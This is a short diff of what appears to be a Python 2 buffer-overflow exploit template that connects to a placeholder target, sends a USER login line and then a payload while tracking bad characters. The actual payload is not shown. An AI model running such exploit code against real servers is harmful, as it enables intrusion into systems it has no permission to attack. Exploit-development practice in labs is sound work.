@@ -16,6 +16,8 @@ badchar = [0x00]
 try:
 	print "Sending pattern.."
 	s.connect(("targetip",targetport))
+        data = s.recv(1024)
+        s.send('USER username' +'\r\n')
 	data = s.recv(1024)
 	s.send(Payload+'\r\n')
 	print "\nDone!."
